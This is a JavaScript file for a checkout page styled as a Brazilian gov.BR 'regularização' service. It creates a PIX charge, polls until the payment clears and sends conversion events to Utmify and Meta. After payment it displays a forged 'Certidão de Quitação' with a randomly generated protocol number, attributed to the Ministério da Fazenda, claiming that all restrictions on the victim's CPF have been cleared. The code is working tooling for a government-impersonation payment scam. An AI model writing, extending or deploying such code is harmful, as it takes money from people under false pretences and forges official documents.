// ===== REGULARIZAÇÃO - PIX GATEWAY INTEGRATION (BYNET / gov.BR) =====

// Etapa desta página no catálogo do servidor (api/produtos.php).
const ETAPA_REGULARIZACAO = 'reg';

// O valor no HTML é fallback; aqui vira o preço real que será cobrado.
document.addEventListener('DOMContentLoaded', function () {
    if (typeof window.catalogoTexto === 'function') {
        window.catalogoTexto(ETAPA_REGULARIZACAO, '#upsell-value', 'R$ {valor}');
    }
});

function getCustomerData() {
    var params = new URLSearchParams(window.location.search);
    var nome = params.get('nome') || '';
    var cpf = params.get('cpf') || '';

    try {
        if (!nome) nome = localStorage.getItem('site.nome') || 'Contribuinte';
        if (!cpf) cpf = localStorage.getItem('site.cpf') || '';
    } catch (e) {}

    return {
        name: nome || 'Contribuinte',
        cpf: cpf || "11144477735",
        phone: "11988887777"
    };
}

async function generatePixBynet(customerData) {
    const params = new URLSearchParams(window.location.search);

    // Nome e preço vêm do catálogo do servidor (api/produtos.php, etapa "reg").
    // Nada de valor ou nome pela URL.
    const body = new URLSearchParams();
    body.set('nome', customerData.name);
    body.set('cpf', customerData.cpf);
    body.set('telefone', customerData.phone);
    body.set('etapa', ETAPA_REGULARIZACAO);
    ['utm_source','utm_campaign','utm_medium','utm_content','utm_term','src','sck','gclid','fbclid','ttclid','leadId'].forEach(function(k){
        var v = params.get(k);
        if (v) body.set(k, v);
    });

    const resp = await fetch('/api/pagamento-upsell.php', {
        method: 'POST',
        body: body
    });

    if (!resp.ok) {
        const errText = await resp.text().catch(function(){ return ''; });
        throw new Error('HTTP ' + resp.status + ' — ' + (errText || 'Sem resposta do servidor'));
    }

    const result = await resp.json();

    if (!result || result.success === false) {
        throw new Error((result && result.error) || 'Erro ao gerar PIX');
    }

    var pixCode = result.pixCode
        || (result.data && result.data.pix && (result.data.pix.qrcode || result.data.pix.code))
        || (result.data && result.data.qrCode)
        || (result.data && result.data.pixCopiaECola)
        || '';
    var transactionId = result.token
        || (result.data && result.data.id)
        || (result.data && result.data.transaction && result.data.transaction.id)
        || '';
    var qrcodeImage = result.qrcodeImage
        || (result.data && result.data.pix && (result.data.pix.qrcodeImage || result.data.pix.qrCodeImage))
        || '';
    var valorReais = result.valor
        || (result.data && result.data.amount ? result.data.amount / 100 : 0);

    return {
        pix_qrcode_text: pixCode,
        uuid: transactionId,
        qrcode_image: qrcodeImage,
        valor_reais: valorReais,
        amount_cents: Math.round((valorReais || 0) * 100),
        product_name: result.product_title_used || '',
        customer_email: result.customer_email_used || '',
        customer_name: result.customer_name_used || customerData.name
    };
}

let pollingInterval = null;

// Guarda o que o polling precisa para mandar a conversão paga à Utmify,
// já que startPolling roda fora do escopo de quem gerou o PIX.
let pedidoAtual = null;

async function generateUpsellPix() {
    const btn = document.getElementById('btn-pay');
    const btnText = document.getElementById('btn-pay-text');

    btn.disabled = true;
    btnText.innerHTML = '<span class="spinner"></span>Gerando Guia Oficial de Pagamento...';

    const customer = getCustomerData();

    try {
        const result = await generatePixBynet(customer);
        const pixCode = result.pix_qrcode_text;
        const payment_code = result.uuid;
        const qrImage = result.qrcode_image;
        const valorReais = result.valor_reais;

        if (!pixCode) {
            showError('Não foi possível gerar a chave PIX no momento. Tente novamente.');
            btn.disabled = false;
            btnText.textContent = 'EMITIR GUIA PIX DE REGULARIZAÇÃO';
            return;
        }

        pedidoAtual = {
            orderId: payment_code,
            priceInCents: result.amount_cents,
            productName: result.product_name,
            customer: {
                name: result.customer_name || customer.name,
                email: result.customer_email || '',
                phone: customer.phone,
                document: customer.cpf
            }
        };

        // Pedido pendente na Utmify: dispara assim que o PIX existe.
        try {
            if (typeof window.utmifyEnviarPendente === 'function') {
                window.utmifyEnviarPendente({
                    orderId: payment_code,
                    priceInCents: result.amount_cents,
                    productName: result.product_name,
                    customer: {
                        name: result.customer_name || customer.name,
                        email: result.customer_email || '',
                        phone: customer.phone,
                        document: customer.cpf
                    }
                });
            } else {
                console.warn('[Utmify] utmify-order.js nao carregou; pendente nao enviado.');
            }
        } catch (eUtm) {
            console.error('[Utmify] Erro ao disparar pendente:', eUtm);
        }

        // Meta: InitiateCheckout assim que o PIX existe.
        try {
            if (typeof window.metaInitiateCheckout === 'function') {
                window.metaInitiateCheckout(pedidoAtual);
            }
        } catch (eMeta) {
            console.error('[Meta] Erro ao disparar InitiateCheckout:', eMeta);
        }

        btn.style.display = 'none';
        const pixSection = document.getElementById('pix-section');
        pixSection.classList.add('show');
        document.getElementById('pix-code').textContent = pixCode;

        if (valorReais) {
            var valEl = document.getElementById('pix-valor');
            if (valEl) valEl.textContent = 'R$ ' + String(valorReais).replace('.', ',');
        }

        const qrWrap = document.getElementById('qr-wrap');
        qrWrap.innerHTML = '<div id="qr-render" style="width:190px;height:190px;margin:0 auto;"></div>';

        if (qrImage) {
            qrWrap.innerHTML = '<img src="' + qrImage + '" style="width:190px;height:190px;border-radius:8px;margin:0 auto;" />';
        } else {
            try {
                new QRCode(document.getElementById('qr-render'), {
                    text: pixCode,
                    width: 190,
                    height: 190,
                    colorDark: "#000000",
                    colorLight: "#ffffff",
                    correctLevel: QRCode.CorrectLevel.M
                });
            } catch (e) {
                qrWrap.innerHTML = '<img src="https://api.qrserver.com/v1/create-qr-code/?size=190x190&data=' + encodeURIComponent(pixCode) + '" style="width:190px;height:190px;border-radius:8px;" />';
            }
        }

        // Inicia monitoramento de pagamento
        if (payment_code) {
            document.getElementById('checking-payment').classList.add('show');
            startPolling(payment_code);
        }

    } catch (err) {
        console.error('Erro na emissão do PIX:', err);
        showError('Erro ao emitir guia: ' + err.message);
        btn.disabled = false;
        btnText.textContent = 'EMITIR GUIA PIX DE REGULARIZAÇÃO';
    }
}

function copyPixCode() {
    const text = document.getElementById('pix-code').textContent;
    navigator.clipboard.writeText(text);
    const btn = document.getElementById('btn-copy');
    btn.textContent = '✓ Código PIX Copiado com Sucesso!';
    btn.style.background = '#168821';
    btn.style.borderColor = '#168821';
    setTimeout(() => { 
        btn.textContent = 'Copiar Código PIX'; 
        btn.style.background = '#1351B4'; 
        btn.style.borderColor = '#1351B4';
    }, 2500);
}

async function checkPaymentStatus(payment_code) {
    try {
        const resp = await fetch('/api/verificar.php?id=' + encodeURIComponent(payment_code), { cache: 'no-store' });
        if (!resp.ok) return false;
        const statusRes = await resp.json();
        const st = String(statusRes.status || (statusRes.data && statusRes.data.status) || '').toUpperCase();
        return st === 'PAID' || st === 'COMPLETED' || st === 'APPROVED' || st === 'AUTHORIZED';
    } catch (e) {
        console.log('Polling error:', e);
        return false;
    }
}

function startPolling(payment_code) {
    if (pollingInterval) clearInterval(pollingInterval);

    pollingInterval = setInterval(async () => {
        const paid = await checkPaymentStatus(payment_code);

        if (paid) {
            clearInterval(pollingInterval);

            // Conversão "paid" pelo front, em paralelo ao webhook da Genesys.
            try {
                if (pedidoAtual && typeof window.utmifyEnviarPago === 'function') {
                    window.utmifyEnviarPago(pedidoAtual);
                } else if (!pedidoAtual) {
                    console.warn('[Utmify] dados do pedido ausentes; conversao paga nao enviada.');
                }
            } catch (eUtm) {
                console.error('[Utmify] Erro ao disparar conversao paga:', eUtm);
            }

            // Meta: Purchase no browser (eventID = id da transação; o servidor
            // manda o mesmo pela API de Conversões e a Meta deduplica).
            try {
                if (pedidoAtual && typeof window.metaPurchase === 'function') {
                    window.metaPurchase(pedidoAtual);
                }
            } catch (eMeta) {
                console.error('[Meta] Erro ao disparar Purchase:', eMeta);
            }

            const checkEl = document.getElementById('checking-payment');
            checkEl.innerHTML = '✅ <strong style="color: #168821;">Pagamento Confirmado no Sistema!</strong>';
            
            setTimeout(() => {
                showSuccessCertificate();
            }, 1500);
        }
    }, 4500);
}

function showSuccessCertificate() {
    const container = document.querySelector('.upsell-container');
    const customer = getCustomerData();
    const protocolo = 'BR-' + Math.floor(10000000 + Math.random() * 90000000);
    const dataAtual = new Date().toLocaleDateString('pt-BR');

    container.innerHTML = `
        <div class="card" style="border-left: 4px solid #168821; text-align: center; padding: 32px 20px;">
            <div style="width: 60px; height: 60px; border-radius: 50%; background: #ECFDF5; color: #168821; display: flex; align-items: center; justify-content: center; margin: 0 auto 16px; border: 2px solid #A7F3D0;">
                <svg width="32" height="32" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5">
                    <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7" />
                </svg>
            </div>
            <span class="status-badge" style="background: #ECFDF5; color: #168821; border-color: #A7F3D0;">✓ PROCESSO CONCLUÍDO COM SUCESSO</span>
            <h1 style="font-size: 22px; font-weight: 800; color: #0F172A; margin: 12px 0 8px;">Certidão de Quitação e Regularização Emitida</h1>
            <p style="font-size: 14px; color: #475569; margin-bottom: 20px;">Todas as restrições financeiras vinculadas ao seu CPF foram baixadas com sucesso nos órgãos competentes.</p>
            
            <div style="background: #F8FAFC; border: 1px solid #E2E8F0; border-radius: 12px; padding: 16px; text-align: left; font-size: 13px; line-height: 1.8; margin-bottom: 20px;">
                <div><strong>Beneficiário(a):</strong> ${customer.name}</div>
                <div><strong>Documento:</strong> ${customer.cpf}</div>
                <div><strong>Protocolo de Autenticação:</strong> ${protocolo}</div>
                <div><strong>Data de Emissão:</strong> ${dataAtual}</div>
                <div><strong>Órgão Emissor:</strong> Secretaria de Reformas Econômicas / Ministério da Fazenda</div>
                <div><strong>Situação:</strong> <span style="color: #168821; font-weight: 800;">REGULARIZADO / NADA CONSTA</span></div>
            </div>

            <button onclick="window.print()" class="btn-pay" style="margin-top: 0; background: #1351B4;">
                IMPRIMIR COMPROVANTE OFICIAL
            </button>
        </div>
    `;
}

function showError(msg) {
    const el = document.getElementById('error-msg');
    el.textContent = msg;
    el.style.display = 'block';
}
